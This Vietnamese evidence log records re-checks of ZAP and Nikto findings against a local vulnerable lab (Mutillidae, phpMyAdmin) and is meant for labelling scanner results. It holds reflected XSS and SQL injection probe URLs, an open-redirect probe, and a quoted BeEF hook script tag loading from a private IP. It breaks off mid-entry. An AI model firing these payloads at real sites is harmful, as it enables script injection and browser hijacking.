# Bằng chứng kiểm chứng: lần quét #24 (http://localhost:8090)

Thu lúc 2026-09-19 16:35 bằng `python -m eval.evidence 24`.

**File này chỉ ghi dữ kiện, không có kết luận.** Quyết định 1/0 là của người gán,
theo hai câu hỏi trong `HUONG_DAN_GAN_NHAN.md`. Mỗi mục ghi lệnh đã chạy để tự chạy lại được.

Trạng thái lab lúc kiểm (đối chiếu với lúc quét):

    HTTP/1.1 302 Found
    Server: Apache/2.4.7 (Ubuntu)

Tìm dòng tương ứng trong `ground_truth.csv` bằng fingerprint (Ctrl+F).

---

## Dòng 2: Cross Site Scripting (Persistent)

`fdb252661d23ae94` · zap · scanner xếp High
· url `` http://localhost:8090/phpmyadmin/server_databases.php?dbstats=1&pos=0&sort_by=SCHEMA_DATA_FREE&sort_order=desc&token=f3e66299f6885b76b07c9e8396c40f0d `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/server_databases.php?dbstats=1&pos=0&sort_by=SCHEMA_DATA_FREE&sort_order=desc&token=f3e66299f6885b76b07c9e8396c40f0d
  200 text/html; charset=utf-8 131852
  số thẻ <script>: 12
  đoạn quanh bằng chứng scanner ghi: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w
```

---

## Dòng 3: Cross Site Scripting (Reflected)

`eedfc930990ff5db` · zap · scanner xếp High
· url `` http://localhost:8090/phpmyadmin/server_databases.php?checkall=1&dbstats=%3Balert%281%29&sort_by=SCHEMA_NAME&sort_order=asc&token=f3e66299f6885b76b07c9e8396c40f0d `` · scanner ghi: `` ;alert(1) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/server_databases.php?checkall=1&dbstats=%3Balert%281%29&sort_by=SCHEMA_NAME&sort_order=asc&token=f3e66299f6885b76b07c9e8396c40f0d
  200 text/html; charset=utf-8 131852
  số thẻ <script>: 12
  đoạn quanh bằng chứng scanner ghi: ool"><input type="checkbox" name="selected_dbs[]" title="&quot;&gt;&lt;scrIpt&gt;alert(1);&lt;/scRipt&gt;" value="&quot;&gt;&lt;scrIpt&gt;alert(1);&lt;/scRipt&gt;" /></t
(Kiểm tra trên chỉ gọi lại URL scanner báo; tự kiểm chứng theo HUONG_DAN_GAN_NHAN.md.)
```

---

## Dòng 4: External Redirect

`44b475fb80f116e9` · zap · scanner xếp High
· url `` http://localhost:8090/phpmyadmin/url.php?token=f3e66299f6885b76b07c9e8396c40f0d&url=https%3A%2F%2F2075468471046354802.owasp.org `` · scanner ghi: `` https://2075468471046354802.owasp.org ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/url.php?token=f3e66299f6885b76b07c9e8396c40f0d&url=https%3A%2F%2F2075468471046354802.owasp.org
  302 text/html 0
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: (không tìm thấy)
```

---

## Dòng 5: Off-site Redirect

`d2340aec5ec35a4b` · zap · scanner xếp High
· url `` http://localhost:8090/phpmyadmin/url.php?token=f3e66299f6885b76b07c9e8396c40f0d&url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Findex.html `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/url.php?token=f3e66299f6885b76b07c9e8396c40f0d&url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Findex.html
  302 text/html 0
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: 
```

---

## Dòng 6: Path Traversal

`6ef5fbd2fb13dbba` · zap · scanner xếp High
· url `` http://localhost:8090/phpmyadmin/prefs_manage.php `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/prefs_manage.php
  200 text/html; charset=utf-8 15530
  số thẻ <script>: 13
  đoạn quanh bằng chứng scanner ghi: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w
```

---

## Dòng 7: SQL Injection

`48af800c6ef141e9` · zap · scanner xếp High
· url `` http://localhost:8090/phpmyadmin/main.php?target=chk_rel.php+AND+1%3D1+--+&token=f3e66299f6885b76b07c9e8396c40f0d `` · scanner ghi: `` You have an error in your SQL syntax ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/main.php?target=chk_rel.php+AND+1%3D1+--+&token=f3e66299f6885b76b07c9e8396c40f0d
  200 text/html; charset=utf-8 39332
  số thẻ <script>: 13
  đoạn quanh bằng chứng scanner ghi: (không tìm thấy)
(Kiểm tra trên chỉ gọi lại URL scanner báo; tự kiểm chứng theo HUONG_DAN_GAN_NHAN.md.)
```

---

## Dòng 8: SQL Injection - MySQL (Time Based)

`a740905d7f6c81c9` · zap · scanner xếp High
· url `` http://localhost:8090/phpmyadmin/import.php?show_as_php=1&show_query=1&sql_query=CREATE+DATABASE+%60ZAP%60+DEFAULT+CHARACTER+SET+armscii8+COLLATE+armscii8_bin%3B&token=f3e66299f6885b76b07c9e8396c40f0d `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/import.php?show_as_php=1&show_query=1&sql_query=CREATE+DATABASE+%60ZAP%60+DEFAULT+CHARACTER+SET+armscii8+COLLATE+armscii8_bin%3B&token=f3e66299f6885b76b07c9e8396c40f0d
  200 text/html; charset=utf-8 5587
  số thẻ <script>: 12
  đoạn quanh bằng chứng scanner ghi: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w
(Kiểm tra trên chỉ gọi lại URL scanner báo; tự kiểm chứng theo HUONG_DAN_GAN_NHAN.md.)
```

---

## Dòng 9: Absence of Anti-CSRF Tokens

`234b04d2620d1a6d` · zap · scanner xếp Medium
· url `` http://localhost:8090/database-offline.php `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/database-offline.php
  200 text/html 3344
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: 
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.
```

---

## Dòng 10: Application Error Disclosure

`8bef88fb69a6ca53` · zap · scanner xếp Medium
· url `` http://localhost:8090/classes/ `` · scanner ghi: `` Parent Directory ``

```text
$ curl.exe -s http://localhost:8090/classes/
  200 text/html;charset=UTF-8 3662
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi:  valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td 
```

---

## Dòng 11: Content Security Policy (CSP) Header Not Set

`a54ebc2138274d36` · zap · scanner xếp Medium
· url `` http://localhost:8090/config.inc `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/config.inc
HTTP/1.1 404 Not Found
  Content-Security-Policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:01 GMT
  server: Apache/2.4.7 (Ubuntu)
  content-length: 284
  content-type: text/html; charset=iso-8859-1
```

---

## Dòng 12: Directory Browsing

`cfd7d591f933e003` · zap · scanner xếp Medium
· url `` http://localhost:8090/classes/ `` · scanner ghi: `` Index of /classes ``

```text
$ curl.exe -s http://localhost:8090/classes/
  200 text/html;charset=UTF-8 3662
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /classes</title>
 </head>
 <body>
<h1>Index of /classes</h1>
  <table>
   <tr><th valign
```

---

## Dòng 13: Missing Anti-clickjacking Header

`b9ea364b5ae65b74` · zap · scanner xếp Medium
· url `` http://localhost:8090/classes/ `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/classes/
HTTP/1.1 200 OK
  X-Frame-Options: KHÔNG CÓ
  Content-Security-Policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:02 GMT
  server: Apache/2.4.7 (Ubuntu)
  vary: Accept-Encoding
  content-length: 3662
  content-type: text/html;charset=UTF-8
```

---

## Dòng 14: Source Code Disclosure - PHP

`b3d8821035f50aa4` · zap · scanner xếp Medium
· url `` http://localhost:8090/includes/anti-framing-protection.inc `` · scanner ghi: `` if(top != self) top.location.replace(location); "; ?> ``

```text
$ curl.exe -s http://localhost:8090/includes/anti-framing-protection.inc
  200  704
  số thẻ <script>: 1
  đoạn quanh bằng chứng scanner ghi: o help
	 * with older browsers.
	 */
	echo "<script type=\"text/javascript\">if(top != self) top.location.replace(location);</script>";
?>
```

---

## Dòng 15: Sub Resource Integrity Attribute Missing

`9b01731baaab5445` · zap · scanner xếp Medium
· url `` http://localhost:8090/documentation/Mutillidae-Test-Scripts.txt `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/documentation/Mutillidae-Test-Scripts.txt
  200 text/plain 62239
  số thẻ <script>: 33
  đoạn quanh bằng chứng scanner ghi: Topics

Installation

	XAMPP
	VM
	Samurai - Bootable DVD
	Samurai Install
```

---

## Dòng 16: Vulnerable JS Library

`d2fbc0c59e4e3055` · zap · scanner xếp Medium
· url `` http://localhost:8090/javascript/ddsmoothmenu/jquery.min.js `` · scanner ghi: `` * jQuery JavaScript Library v1.3.2 ``

```text
$ curl.exe -s http://localhost:8090/javascript/ddsmoothmenu/jquery.min.js
  200 application/javascript 57254
  số thẻ <script>: 1
  đoạn quanh bằng chứng scanner ghi: /*
 * jQuery JavaScript Library v1.3.2
 * http://jquery.com/
 *
 * Copyright (c) 2009 John Resig
 * Dual licensed 
```

---

## Dòng 17: Big Redirect Detected (Potential Sensitive Information Leak)

`b065721a117ac1b1` · zap · scanner xếp Low
· url `` http://localhost:8090/database-offline.php `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/database-offline.php
  200 text/html 3344
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: 
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.
```

---

## Dòng 18: CSP: X-Content-Security-Policy

`d6a80570c834cf1a` · zap · scanner xếp Low
· url `` http://localhost:8090/phpmyadmin/ `` · scanner ghi: `` allow 'self'; options inline-script eval-script; frame-ancestors 'self'; img-src 'self' data:; script-src 'self' http://www.phpmyadmin.net ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/phpmyadmin/
HTTP/1.1 200 OK
  Content-Security-Policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 4
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:05 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: phpMyAdmin=981men1j5d23rc5lonigbnc8c7b91b50; path=/phpmyadmin/; HttpOnly
  expires: Sat, 19 Sep 2026 09:36:05 +0000
  cache-control: no-store, no-cache, must-revalidate, pre-check=0, post-check=0, max-age=0
  last-modified: Sat, 19 Sep 2026 09:36:05 +0000
  x-frame-options: SAMEORIGIN
  x-content-security-policy: allow 'self'; options inline-script eval-script; frame-ancestors 'self'; img-src 'self' data:; script-src 'self' http://www.phpmyadmin.net
  x-webkit-csp: allow 'self' http://www.phpmyadmin.net; options inline-script eval-script
  pragma: no-cache
  vary: Accept-Encoding
  content-length: 2740
  content-type: text/html; charset=utf-8
```

---

## Dòng 19: CSP: X-WebKit-CSP

`d675c3731d515b4f` · zap · scanner xếp Low
· url `` http://localhost:8090/phpmyadmin/ `` · scanner ghi: `` allow 'self' http://www.phpmyadmin.net; options inline-script eval-script ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/phpmyadmin/
HTTP/1.1 200 OK
  Content-Security-Policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 4
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:05 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: phpMyAdmin=5n069uma822fllqm0notf57o93r73unn; path=/phpmyadmin/; HttpOnly
  expires: Sat, 19 Sep 2026 09:36:05 +0000
  cache-control: no-store, no-cache, must-revalidate, pre-check=0, post-check=0, max-age=0
  last-modified: Sat, 19 Sep 2026 09:36:05 +0000
  x-frame-options: SAMEORIGIN
  x-content-security-policy: allow 'self'; options inline-script eval-script; frame-ancestors 'self'; img-src 'self' data:; script-src 'self' http://www.phpmyadmin.net
  x-webkit-csp: allow 'self' http://www.phpmyadmin.net; options inline-script eval-script
  pragma: no-cache
  vary: Accept-Encoding
  content-length: 2740
  content-type: text/html; charset=utf-8
```

---

## Dòng 20: Cookie No HttpOnly Flag

`7cd8607504180981` · zap · scanner xếp Low
· url `` http://localhost:8090 `` · scanner ghi: `` Set-Cookie: PHPSESSID ``

```text
$ curl.exe -s http://localhost:8090
  302 text/html 0
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: (không tìm thấy)
```

---

## Dòng 21: Cookie without SameSite Attribute

`d70703c409eae4f4` · zap · scanner xếp Low
· url `` http://localhost:8090 `` · scanner ghi: `` Set-Cookie: PHPSESSID ``

```text
$ curl.exe -s http://localhost:8090
  302 text/html 0
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: (không tìm thấy)
```

---

## Dòng 22: Cross-Origin-Embedder-Policy Header Missing or Invalid

`889c3ba9a63fe998` · zap · scanner xếp Low
· url `` http://localhost:8090/classes/?C=N;O=A `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/classes/?C=N;O=A
HTTP/1.1 200 OK
  Cross-Origin-Embedder-Policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:06 GMT
  server: Apache/2.4.7 (Ubuntu)
  vary: Accept-Encoding
  content-length: 3662
  content-type: text/html;charset=UTF-8
```

---

## Dòng 23: Cross-Origin-Opener-Policy Header Missing or Invalid

`c3b6263e6ca8324c` · zap · scanner xếp Low
· url `` http://localhost:8090/classes/?C=M;O=A `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/classes/?C=M;O=A
HTTP/1.1 200 OK
  Cross-Origin-Opener-Policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:07 GMT
  server: Apache/2.4.7 (Ubuntu)
  vary: Accept-Encoding
  content-length: 3662
  content-type: text/html;charset=UTF-8
```

---

## Dòng 24: Cross-Origin-Resource-Policy Header Missing or Invalid

`33d01535b2682e2c` · zap · scanner xếp Low
· url `` http://localhost:8090/database-offline.php `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/database-offline.php
HTTP/1.1 200 OK
  Cross-Origin-Resource-Policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 7
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 1
  tài nguyên từ origin khác trong HTML: https://www.youtube.com
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:07 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=mrn43pa639brg3h64hlkfuh4o3; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  vary: Accept-Encoding
  content-length: 3344
  content-type: text/html
```

---

## Dòng 25: Dangerous JS Functions

`03fb900d860642b2` · zap · scanner xếp Low
· url `` http://localhost:8090/phpmyadmin/js/functions.js?ts=1526333067 `` · scanner ghi: `` eval( ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/js/functions.js?ts=1526333067
  kích thước: 47858 ký tự
Ba chỗ gọi bypassSecurityTrustHtml đầu tiên (±80 ký tự):
```

---

## Dòng 26: In Page Banner Information Leak

`902ae593ed89c080` · zap · scanner xếp Low
· url `` http://localhost:8090/config.inc `` · scanner ghi: `` Apache/2.4.7 ``

```text
$ curl.exe -s http://localhost:8090/config.inc
  404 text/html; charset=iso-8859-1 284
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: p>The requested URL /config.inc was not found on this server.</p>
<hr>
<address>Apache/2.4.7 (Ubuntu) Server at localhost Port 8090</address>
</body></html>

```

---

## Dòng 27: Information Disclosure - Debug Error Messages

`ba07b2d33d252d46` · zap · scanner xếp Low
· url `` http://localhost:8090/database-offline.php `` · scanner ghi: `` Access denied for user ``

```text
$ curl.exe -s http://localhost:8090/database-offline.php
  200 text/html 3344
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: classes/MySQLHandler.php contains the database configuration. Connection error: Access denied for user 'admin'@'localhost' (using password: YES)		</td>
	</tr>
	<tr><td>&nbsp;</td><
```

---

## Dòng 28: Permissions Policy Header Not Set

`2510e61da8ca4b12` · zap · scanner xếp Low
· url `` http://localhost:8090/database-offline.php `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/database-offline.php
HTTP/1.1 200 OK
  Permissions-Policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 7
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 1
  tài nguyên từ origin khác trong HTML: https://www.youtube.com
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:09 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=2qatpnatqlopnvs335u6dvng77; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  vary: Accept-Encoding
  content-length: 3344
  content-type: text/html
```

---

## Dòng 29: Private IP Disclosure

`b98dce20c2bb8a18` · zap · scanner xếp Low
· url `` http://localhost:8090/documentation/Mutillidae-Test-Scripts.txt `` · scanner ghi: `` 192.168.56.103 ``

```text
$ curl.exe -s http://localhost:8090/documentation/Mutillidae-Test-Scripts.txt
  200 text/plain 62239
  số thẻ <script>: 33
  đoạn quanh bằng chứng scanner ghi: ost developers do not understand how dangerous XSS can be
<script src=\'http://192.168.56.103/beef/hook/beefmagic.js.php\'></script>

-------------------------------------
```

---

## Dòng 30: Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s)

`e13532ea6a9c8807` · zap · scanner xếp Low
· url `` http://localhost:8090 `` · scanner ghi: `` X-Powered-By: PHP/5.5.9-1ubuntu4.25 ``

```text
$ curl.exe -s http://localhost:8090
  302 text/html 0
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: (không tìm thấy)
```

---

## Dòng 31: Server Leaks Version Information via "Server" HTTP Response Header Field

`24b56a2622b70091` · zap · scanner xếp Low
· url `` http://localhost:8090/ `` · scanner ghi: `` Apache/2.4.7 (Ubuntu) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/
HTTP/1.1 302 Found
  Server: Apache/2.4.7 (Ubuntu)
  X-Powered-By: PHP/5.5.9-1ubuntu4.25
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:10 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=mou9maicev048qp0255dekmv51; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  location: database-offline.php
  content-length: 0
  content-type: text/html
```

---

## Dòng 32: Timestamp Disclosure - Unix

`20e49727388c7a0b` · zap · scanner xếp Low
· url `` http://localhost:8090/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=f3e66299f6885b76b07c9e8396c40f0d `` · scanner ghi: `` 1526333067 ``

```text
Con số scanner báo: 1526333067  ->  2018-05-14T21:24:27+00:00 (UTC)
$ curl.exe -s http://localhost:8090/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=f3e66299f6885b76b07c9e8396c40f0d
  đoạn quanh con số: noindex,nofollow" />
<script src="./js/cross_framing_protection.js?ts=1526333067" type="text/javascript"></script>
<script src="./js/jquery/jquery-1.6
```

---

## Dòng 33: X-Content-Type-Options Header Missing

`d3c767640d5a5a30` · zap · scanner xếp Low
· url `` http://localhost:8090/database-offline.php `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/database-offline.php
HTTP/1.1 200 OK
  X-Content-Type-Options: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 7
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 1
  tài nguyên từ origin khác trong HTML: https://www.youtube.com
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:11 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=6liuu3ce5fo34hm20vqhccjub4; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  vary: Accept-Encoding
  content-length: 3344
  content-type: text/html
```

---

## Dòng 34: /phpinfo.php: Output from the phpinfo() function was found.

`0ee18800ba224d66` · nikto · scanner xếp Info
· url `` http://localhost:8090/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script> `` · scanner ghi: `` GET /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script> ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
  200 text/html 81115
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Secret PHP Server Configuration Page &nbsp; phpinfo() PHP Version 5.5.9-1ubuntu4.25 System Linux 24ed569f7218 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64 Build Date May 10 2018 14:37:08 Server API Apache 2.0 Handler Virtual Directory Support disabled 
```

---

## Dòng 35: /phpmyadmin/:X-Frame-Options header is deprecated and was replaced with the Content-Securi

`4f53a6e974bae9cd` · nikto · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/ `` · scanner ghi: `` GET /phpmyadmin/ ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/phpmyadmin/
  200 text/html; charset=utf-8 2740
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  phpMyAdmin 3.5.2.2 - localhost:8090 phpMyAdmin is more friendly with a frames-capable browser.
```

---

## Dòng 36: Apache default file found.

`2c91625f5c78885f` · nikto · scanner xếp Info
· url `` http://localhost:8090/icons/README `` · scanner ghi: `` GET /icons/README ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/icons/README
  200  5108
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Public Domain Icons These icons were originally made for Mosaic for X and have been included in the NCSA httpd and Apache server distributions in the past. They are in the public domain and may be freely included in any application. The originals were done by Kevin Hughes (kevinh@kevcom.com). Andy P
```

---

## Dòng 37: Apache/2.4.7 appears to be outdated (current is at least 2.4.63). Apache 2.2.34 is the EOL

`c6a0650498516e77` · nikto · scanner xếp Info
· url `` http://localhost:8090/ `` · scanner ghi: `` HEAD / ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/
  302 text/html 0
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  
```

---

## Dòng 38: Authentication Request Identified

`4fb159c89f650f48` · zap · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/server_synchronize.php `` · scanner ghi: `` src_pass ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/server_synchronize.php
  200 text/html; charset=utf-8 21213
  số thẻ <script>: 13
  đoạn quanh bằng chứng scanner ghi: ote-server">
        <td>Password</td>
        <td><input type="password" name="src_pass" class="server-pass" /> </td>
    </tr>
    <tr class="odd toggler remote-serve
```

---

## Dòng 39: Content-Type Header Missing

`25e64bf855599b39` · zap · scanner xếp Info
· url `` http://localhost:8090/includes/anti-framing-protection.inc `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/includes/anti-framing-protection.inc
  200  704
  số thẻ <script>: 1
  đoạn quanh bằng chứng scanner ghi: <?php
   	/* ------------------------------------------
    * ANTI-CLICK-JACKI
```

---

## Dòng 40: Cookie PHPSESSID created without the httponly flag.

`536219704e16c1dd` · nikto · scanner xếp Info
· url `` http://localhost:8090/ `` · scanner ghi: `` GET / ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/
  302 text/html 0
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  
```

---

## Dòng 41: Cookie Poisoning

`3068752dff660398` · zap · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/index.php?set_theme=original&token=f3e66299f6885b76b07c9e8396c40f0d `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/index.php?set_theme=original&token=f3e66299f6885b76b07c9e8396c40f0d
  200 text/html; charset=utf-8 2740
  số thẻ <script>: 4
  đoạn quanh bằng chứng scanner ghi: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN"
    "http://www.w3.or
```

---

## Dòng 42: Directory indexing found.

`88d03e86d70c7bb7` · nikto · scanner xếp Info
· url `` http://localhost:8090/data/ `` · scanner ghi: `` GET /data/ ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/data/
  200 text/html;charset=UTF-8 940
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Index of /data Index of /data Name Last modified Size Description Parent Directory &nbsp; - &nbsp; accounts.xml 2018-05-14 21:24 3.6K &nbsp; Apache/2.4.7 (Ubuntu) Server at localhost Port 8090
```

---

## Dòng 43: Git HEAD file found. Full repo details may be present.

`998ced8528a486ac` · nikto · scanner xếp Info
· url `` http://localhost:8090/.git/HEAD `` · scanner ghi: `` GET /.git/HEAD ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/.git/HEAD
  200  23
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  ref: refs/heads/master
```

---

## Dòng 44: Git Index file may contain directory listing information.

`f010e579a8749aeb` · nikto · scanner xếp Info
